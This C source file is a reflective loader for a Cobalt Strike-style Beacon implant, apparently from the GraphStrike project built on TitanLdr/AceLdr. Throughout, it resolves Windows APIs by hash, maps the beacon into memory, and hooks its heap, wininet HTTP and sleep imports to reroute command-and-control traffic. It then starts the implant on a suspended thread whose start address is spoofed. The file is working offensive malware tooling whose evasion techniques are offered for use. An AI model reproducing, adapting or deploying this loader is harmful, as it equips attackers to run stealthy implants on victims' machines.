//
// https://github.com/SecIdiot/TitanLdr/blob/master/Main.c
//

#include "include.h"

typedef BOOLEAN ( WINAPI * DLLMAIN_T )(
        HMODULE     ImageBase,
        DWORD       Reason,
        LPVOID      Parameter
);

typedef struct
{
    struct
    {
        D_API( NtGetContextThread );
        D_API( NtResumeThread );
        D_API( NtSetContextThread );
        D_API( RtlCreateUserThread );
        D_API( RtlUserThreadStart );
        D_API( LdrLoadDll );
        D_API( RtlInitUnicodeString );
        D_API( NtAllocateVirtualMemory );
        D_API( NtProtectVirtualMemory );
        D_API( RtlCreateHeap );
        D_API( NtWaitForSingleObject );

    } ntdll;

    struct
    {
        D_API( malloc );
        D_API( memset );

    } msvcrt;

    struct
    {
        D_API( MessageBoxA );
        
    } user32;

} API, *PAPI;

typedef struct
{
    SIZE_T              Exec;
    SIZE_T              Full;
    PIMAGE_NT_HEADERS   NT;
    PIMAGE_DOS_HEADER   Dos;

} REG, *PREG;

#ifndef PTR_TO_HOOK
#define PTR_TO_HOOK( a, b )    C_PTR( U_PTR( a ) + OFFSET( b ) - OFFSET( Stub ) )
#endif

#ifndef memcpy
#define memcpy( destination, source, length ) __builtin_memcpy( destination, source, length );
#endif

SECTION( B ) NTSTATUS resolveLoaderFunctions( PAPI pApi )
{
    PPEB    Peb;
    HANDLE  hNtdll;

    Peb = NtCurrentTeb()->ProcessEnvironmentBlock;
    hNtdll = FindModule( H_LIB_NTDLL, Peb, NULL );

    if( !hNtdll )
    {
        return -1;
    };

    pApi->ntdll.NtAllocateVirtualMemory = FindFunction( hNtdll, H_API_NTALLOCATEVIRTUALMEMORY );
    pApi->ntdll.NtProtectVirtualMemory  = FindFunction( hNtdll, H_API_NTPROTECTVIRTUALMEMORY );
    pApi->ntdll.RtlCreateHeap           = FindFunction( hNtdll, H_API_RTLCREATEHEAP );

    if( !pApi->ntdll.NtAllocateVirtualMemory ||
        !pApi->ntdll.NtProtectVirtualMemory  ||
        !pApi->ntdll.RtlCreateHeap            )
    {
        return -1;
    };

    return STATUS_SUCCESS;
};

SECTION( B ) VOID calculateRegions( PREG pReg )
{
    SIZE_T      ILn = 0;   

    pReg->Dos = C_PTR( G_END() );
    pReg->NT  = C_PTR( U_PTR( pReg->Dos ) + pReg->Dos->e_lfanew );

    ILn = ( ( ( pReg->NT->OptionalHeader.SizeOfImage ) + 0x1000 - 1 ) &~( 0x1000 - 1 ) );
    pReg->Exec = ( ( ( G_END() - OFFSET( Stub ) ) + 0x1000 - 1 ) &~ ( 0x1000 - 1 ) );
    pReg->Full = ILn + pReg->Exec;

    return;
};

SECTION( B ) VOID copyStub( PVOID buffer )
{   
    PVOID Destination   = buffer;
    PVOID Source        = C_PTR( OFFSET( Stub ) );
    DWORD Length        = U_PTR( G_END() - OFFSET( Stub ) );

    memcpy( Destination, Source, Length );
};

SECTION( B ) PVOID copyBeaconSections( PVOID buffer, REG reg )
{
    PVOID                   Map;
    PIMAGE_SECTION_HEADER   Sec;
    PVOID                   Destination;
    PVOID                   Source;
    DWORD                   Length;

    Map = C_PTR( U_PTR( buffer ) + reg.Exec );
    Sec = IMAGE_FIRST_SECTION( reg.NT );

    for( int i = 0; i < reg.NT->FileHeader.NumberOfSections; ++i )
    {
        Destination = C_PTR( U_PTR( Map ) + Sec[i].VirtualAddress );
        Source      = C_PTR( U_PTR( reg.Dos ) + Sec[i].PointerToRawData );
        Length      = Sec[i].SizeOfRawData;
        memcpy( Destination, Source, Length );
    };

    return Map;
};

SECTION( B ) VOID installHooks( PVOID map, PVOID buffer, PIMAGE_NT_HEADERS nt )
{
    PIMAGE_DATA_DIRECTORY Dir = Dir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if( Dir->VirtualAddress )
    {
        LdrProcessIat( C_PTR( map ), C_PTR( U_PTR( map ) + Dir->VirtualAddress ) );

        LdrHookImport( C_PTR( map ), C_PTR( U_PTR( map ) + Dir->VirtualAddress ), H_API_GETPROCESSHEAP,         PTR_TO_HOOK( buffer, GetProcessHeap_Hook ) );
        LdrHookImport( C_PTR( map ), C_PTR( U_PTR( map ) + Dir->VirtualAddress ), H_API_RTLALLOCATEHEAP,        PTR_TO_HOOK( buffer, RtlAllocateHeap_Hook ) );
        LdrHookImport( C_PTR( map ), C_PTR( U_PTR( map ) + Dir->VirtualAddress ), H_API_HEAPALLOC,              PTR_TO_HOOK( buffer, HeapAlloc_Hook ) );
        LdrHookImport( C_PTR( map ), C_PTR( U_PTR( map ) + Dir->VirtualAddress ), H_API_INTERNETCONNECTA,       PTR_TO_HOOK( buffer, InternetConnectA_Hook ) );
        LdrHookImport( C_PTR( map ), C_PTR( U_PTR( map ) + Dir->VirtualAddress ), H_API_HTTPOPENREQUESTA,       PTR_TO_HOOK( buffer, HttpOpenRequestA_Hook ) );
        LdrHookImport( C_PTR( map ), C_PTR( U_PTR( map ) + Dir->VirtualAddress ), H_API_HTTPSENDREQUESTA,       PTR_TO_HOOK( buffer, HttpSendRequestA_Hook ) );
        LdrHookImport( C_PTR( map ), C_PTR( U_PTR( map ) + Dir->VirtualAddress ), H_API_INTERNETREADFILE,       PTR_TO_HOOK( buffer, InternetReadFile_Hook ) );
        LdrHookImport( C_PTR( map ), C_PTR( U_PTR( map ) + Dir->VirtualAddress ), H_API_NTWAITFORSINGLEOBJECT,  PTR_TO_HOOK( buffer, NtWaitForSingleObject_Hook ) );
        LdrHookImport( C_PTR( map ), C_PTR( U_PTR( map ) + Dir->VirtualAddress ), H_API_SLEEP,                  PTR_TO_HOOK( buffer, Sleep_Hook ) );
    };

    Dir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

    if( Dir->VirtualAddress )
    {
        LdrProcessRel( C_PTR( map ), C_PTR( U_PTR( map ) + Dir->VirtualAddress ), C_PTR( nt->OptionalHeader.ImageBase ) );
    };
};

SECTION( B ) VOID fillStub( PVOID buffer, HANDLE heap, SIZE_T region )
{
    PSTUB Stub = ( PSTUB )buffer;

    Stub->Region = U_PTR( buffer );
    Stub->Size   = U_PTR( region );
    Stub->Heap   = heap;
};

SECTION( B ) VOID executeBeacon( PVOID entry )
{
    DLLMAIN_T Ent = entry;
    Ent( ( HMODULE )OFFSET( Start ), 1, NULL );
    Ent( ( HMODULE )OFFSET( Start ), 4, NULL );
};

SECTION( B ) VOID Loader( VOID ) 
{
    API         Api;
    REG         Reg;
    NTSTATUS    Status;
    PVOID       MemoryBuffer;
    PVOID       Map;
    HANDLE      BeaconHeap;
    ULONG       OldProtection = 0;  
    
    RtlSecureZeroMemory( &Api, sizeof( Api ) );
    RtlSecureZeroMemory( &Reg, sizeof( Reg ) );

    if( resolveLoaderFunctions( &Api ) == STATUS_SUCCESS )
    {
        calculateRegions( &Reg );
        Status = Api.ntdll.NtAllocateVirtualMemory( ( HANDLE )-1, &MemoryBuffer, 0, &Reg.Full, MEM_COMMIT, PAGE_READWRITE );
        if( Status == STATUS_SUCCESS )
        {
            copyStub( MemoryBuffer );
            Map = copyBeaconSections( MemoryBuffer, Reg );
            BeaconHeap = Api.ntdll.RtlCreateHeap( HEAP_GROWABLE, NULL, 0, 0, NULL, NULL );
            fillStub( MemoryBuffer, BeaconHeap, Reg.Full );
            installHooks( Map, MemoryBuffer, Reg.NT );

            Reg.Exec += IMAGE_FIRST_SECTION( Reg.NT )->SizeOfRawData;
            Status = Api.ntdll.NtProtectVirtualMemory( ( HANDLE )-1, &MemoryBuffer, &Reg.Exec, PAGE_EXECUTE_READ, &OldProtection );
            if( Status == STATUS_SUCCESS )
            {
                executeBeacon( C_PTR( U_PTR( Map ) + Reg.NT->OptionalHeader.AddressOfEntryPoint ) );
            };
        };
    };
};

SECTION( B ) NTSTATUS resolveAPIs( PAPI pApi )
{
    PPEB    Peb;
    HANDLE  hNtdll;
    HANDLE  hCrt;
    UNICODE_STRING      Uni;

    Peb = NtCurrentTeb()->ProcessEnvironmentBlock;
    hNtdll  = FindModule( H_LIB_NTDLL, Peb, NULL );
    hCrt    = FindModule( H_LIB_MSVCRT, Peb, NULL );
    
    if( !hNtdll )
    {
        return -1;
    };

    pApi->ntdll.NtGetContextThread      = FindFunction( hNtdll, H_API_NTGETCONTEXTTHREAD );
    pApi->ntdll.NtSetContextThread      = FindFunction( hNtdll, H_API_NTSETCONTEXTTHREAD );
    pApi->ntdll.NtResumeThread          = FindFunction( hNtdll, H_API_NTRESUMETHREAD );
    pApi->ntdll.RtlUserThreadStart      = FindFunction( hNtdll, H_API_RTLUSERTHREADSTART );
    pApi->ntdll.RtlCreateUserThread     = FindFunction( hNtdll, H_API_RTLCREATEUSERTHREAD );
    pApi->ntdll.LdrLoadDll              = FindFunction( hNtdll, H_API_LDRLOADDLL );
    pApi->ntdll.RtlInitUnicodeString    = FindFunction( hNtdll, H_API_RTLINITUNICODESTRING );
    pApi->ntdll.NtWaitForSingleObject   = FindFunction( hNtdll, H_API_NTWAITFORSINGLEOBJECT );

    if( !hCrt )
    {
        pApi->ntdll.RtlInitUnicodeString( &Uni, C_PTR( OFFSET( L"msvcrt.dll" ) ) );
        pApi->ntdll.LdrLoadDll( NULL, 0, &Uni, &hCrt );
        if ( !hCrt )
        {
            return -1;
        }
    };

    pApi->msvcrt.malloc               = FindFunction( hCrt, H_API_MALLOC);
    pApi->msvcrt.memset               = FindFunction( hCrt, H_API_MEMSET);

    if( !pApi->ntdll.NtGetContextThread     ||
        !pApi->ntdll.NtSetContextThread     ||
        !pApi->ntdll.NtResumeThread         ||
        !pApi->ntdll.RtlUserThreadStart     ||
        !pApi->ntdll.RtlCreateUserThread    ||
        !pApi->ntdll.NtWaitForSingleObject  ||
        !pApi->msvcrt.malloc                ||
        !pApi->msvcrt.memset                 )
    {
        return -1;
    };

    return STATUS_SUCCESS;
};

SECTION( B ) NTSTATUS createBeaconThread( PAPI pApi, PHANDLE thread )
{
    BOOL Suspended = TRUE;
    PVOID StartAddress = C_PTR( pApi->ntdll.RtlUserThreadStart + 0x21 );

    return pApi->ntdll.RtlCreateUserThread( ( HANDLE )-1, NULL, Suspended, 0, 0, 0, ( PUSER_THREAD_START_ROUTINE )StartAddress, NULL, thread, NULL );
};

SECTION( B ) NTSTATUS resolveGraphStrikeFunctions( PAPI pApi, struct MemAddrs* pMemAddrs )
{
    PPEB                Peb;
    HANDLE              hK32;
    HANDLE              hCrt;
    UNICODE_STRING      Uni;

    Peb = NtCurrentTeb()->ProcessEnvironmentBlock;
    pMemAddrs->Api.ntdll.hNtdll = FindModule( H_LIB_NTDLL, Peb, &pMemAddrs->Api.ntdll.size );
    pMemAddrs->Api.net.hNet = FindModule( H_LIB_WININET, Peb, &pMemAddrs->Api.net.size );    
    hK32 = FindModule( H_LIB_KERNEL32, Peb, NULL );
    hCrt = FindModule( H_LIB_MSVCRT, Peb, NULL );

    if( !pMemAddrs->Api.ntdll.hNtdll || !hK32 )
    {
        return -1;
    };

    // Ntdll
    pMemAddrs->Api.ntdll.RtlAllocateHeap           = FindFunction( pMemAddrs->Api.ntdll.hNtdll, H_API_RTLALLOCATEHEAP );
    pMemAddrs->Api.ntdll.NtWaitForSingleObject     = FindFunction( pMemAddrs->Api.ntdll.hNtdll, H_API_NTWAITFORSINGLEOBJECT );

    // Kernel32
    pMemAddrs->Api.k32.QueryPerformanceCounter     = FindFunction( hK32, H_API_QUERYPERFORMANCECOUNTER);
    pMemAddrs->Api.k32.QueryPerformanceFrequency   = FindFunction( hK32, H_API_QUERYPERFORMANCEFREQUENCY);
    pMemAddrs->Api.k32.GetLastError                = FindFunction( hK32, H_API_GETLASTERROR);
    pMemAddrs->Api.k32.SetLastError                = FindFunction( hK32, H_API_SETLASTERROR);
    pMemAddrs->Api.k32.Sleep                       = FindFunction(hK32, H_API_SLEEP);

    // Wininet
    if( !pMemAddrs->Api.net.hNet )
    {
        pApi->ntdll.RtlInitUnicodeString( &Uni, C_PTR( OFFSET( L"wininet.dll" ) ) );
        pApi->ntdll.LdrLoadDll( NULL, 0, &Uni, &pMemAddrs->Api.net.hNet );
        if ( !pMemAddrs->Api.net.hNet )
            return -1;
        
        // Now call FindModule again to populate pMemAddrs with the size of the module
        pMemAddrs->Api.net.hNet = FindModule( H_LIB_WININET, Peb, &pMemAddrs->Api.net.size );   
    }

    pMemAddrs->Api.net.InternetConnectA             = FindFunction(pMemAddrs->Api.net.hNet, H_API_INTERNETCONNECTA);
    pMemAddrs->Api.net.HttpOpenRequestA             = FindFunction(pMemAddrs->Api.net.hNet, H_API_HTTPOPENREQUESTA);
    pMemAddrs->Api.net.HttpSendRequestA             = FindFunction(pMemAddrs->Api.net.hNet, H_API_HTTPSENDREQUESTA);
    pMemAddrs->Api.net.InternetReadFile             = FindFunction(pMemAddrs->Api.net.hNet, H_API_INTERNETREADFILE);
    pMemAddrs->Api.net.InternetCloseHandle          = FindFunction(pMemAddrs->Api.net.hNet, H_API_INTERNETCLOSEHANDLE);

    #ifdef DEBUG
        // User32
        HANDLE hU32 = FindModule( H_LIB_USER32, Peb, NULL );
        if( !hU32 )
        {
            RtlSecureZeroMemory( &Uni, sizeof( Uni ) );
            pApi->ntdll.RtlInitUnicodeString( &Uni, C_PTR( OFFSET( L"user32.dll" ) ) );
            pApi->ntdll.LdrLoadDll( NULL, 0, &Uni, &hU32 );
            if ( !hU32 )
                return -1;
        };

        pMemAddrs->Api.user32.MessageBoxA              = FindFunction( hU32, H_API_MESSAGEBOXA);            
    #endif

    // Msvcrt
    if( !hCrt )
    {
        RtlSecureZeroMemory( &Uni, sizeof( Uni ) );
        pApi->ntdll.RtlInitUnicodeString( &Uni, C_PTR( OFFSET( L"msvcrt.dll" ) ) );
        pApi->ntdll.LdrLoadDll( NULL, 0, &Uni, &hCrt );
        if ( !hCrt )
        {
            return -1;
        }
    };

    pMemAddrs->Api.msvcrt.strlen                   = FindFunction( hCrt, H_API_STRLEN);
    pMemAddrs->Api.msvcrt.malloc                   = FindFunction( hCrt, H_API_MALLOC);
    pMemAddrs->Api.msvcrt.calloc                   = FindFunction( hCrt, H_API_CALLOC);
    pMemAddrs->Api.msvcrt.memset                   = FindFunction( hCrt, H_API_MEMSET);
    pMemAddrs->Api.msvcrt.memcpy                   = FindFunction( hCrt, H_API_MEMCPY);
    pMemAddrs->Api.msvcrt.strstr                   = FindFunction( hCrt, H_API_STRSTR);
    pMemAddrs->Api.msvcrt.sprintf                  = FindFunction( hCrt, H_API_SPRINTF);
    pMemAddrs->Api.msvcrt.free                     = FindFunction( hCrt, H_API_FREE);
    pMemAddrs->Api.msvcrt.strcpy                   = FindFunction( hCrt, H_API_STRCPY);
    pMemAddrs->Api.msvcrt.strcmp                   = FindFunction( hCrt, H_API_STRCMP);
    pMemAddrs->Api.msvcrt.isdigit                  = FindFunction( hCrt, H_API_ISDIGIT);    
    pMemAddrs->Api.msvcrt.tolower                  = FindFunction( hCrt, H_API_TOLOWER);

    //RtlSecureZeroMemory( &Uni, sizeof( Uni ) );

    if( !pMemAddrs->Api.k32.QueryPerformanceCounter   ||
        !pMemAddrs->Api.k32.QueryPerformanceFrequency ||
        !pMemAddrs->Api.k32.Sleep                     ||
        !pMemAddrs->Api.msvcrt.strlen                 ||
        !pMemAddrs->Api.msvcrt.malloc                 ||
        !pMemAddrs->Api.msvcrt.calloc                 ||
        !pMemAddrs->Api.msvcrt.memset                 ||
        !pMemAddrs->Api.msvcrt.memcpy                 ||
        !pMemAddrs->Api.msvcrt.strstr                 ||
        !pMemAddrs->Api.msvcrt.sprintf                ||
        !pMemAddrs->Api.msvcrt.free                   ||
        !pMemAddrs->Api.msvcrt.strcpy                 ||
        !pMemAddrs->Api.msvcrt.strcmp                 ||
        !pMemAddrs->Api.msvcrt.isdigit                ||
        !pMemAddrs->Api.msvcrt.tolower                ||
        !pMemAddrs->Api.net.InternetConnectA          ||
        !pMemAddrs->Api.net.HttpOpenRequestA          ||
        !pMemAddrs->Api.net.HttpSendRequestA          ||
        !pMemAddrs->Api.net.InternetReadFile           )
    {
        return -1;
    };

    return STATUS_SUCCESS;
};

SECTION( B ) VOID GraphStrike( VOID )
{
    API         Api;
    CONTEXT     Ctx;
    HANDLE      Thread;

    RtlSecureZeroMemory( &Api, sizeof( Api ) );
    RtlSecureZeroMemory( &Ctx, sizeof( Ctx ) );

    if( resolveAPIs( &Api ) == STATUS_SUCCESS )
    {
        // Create MemAddr struct to contain important values for GraphStrike
        struct MemAddrs *pMemAddrs  = Api.msvcrt.malloc(sizeof(struct MemAddrs));
        Api.msvcrt.memset(pMemAddrs, 0, sizeof(struct MemAddrs));
        pMemAddrs->graphStrike = (BOOL) U_PTR ( NULL );
        pMemAddrs->firstGet = TRUE;
        pMemAddrs->firstPost = TRUE;
        pMemAddrs->readTasking = FALSE;        
        pMemAddrs->lastTokenTime = 0;

        // Resolve GraphStrike functions for later use
        resolveGraphStrikeFunctions(&Api, pMemAddrs);

        // Store pointer to pMemAddrs for later reference
        ((PMEMADDR)MemAddr)->address = (PVOID*)&pMemAddrs;    

        if( NT_SUCCESS( createBeaconThread( &Api, &Thread ) ) )
        {
            Ctx.ContextFlags = CONTEXT_CONTROL;
            Api.ntdll.NtGetContextThread( Thread, &Ctx );
            Ctx.Rip = ( DWORD64 )C_PTR( Loader );

            Api.ntdll.NtSetContextThread( Thread, &Ctx );

            Api.ntdll.NtResumeThread( Thread, NULL );
            
            // This differs from the original AceLdr, waiting here or else process will exit in many loaders
            Api.ntdll.NtWaitForSingleObject( Thread, FALSE, NULL);
        };
    };

    RtlSecureZeroMemory( &Api, sizeof( Api ) );
    RtlSecureZeroMemory( &Ctx, sizeof( Ctx ) );
};
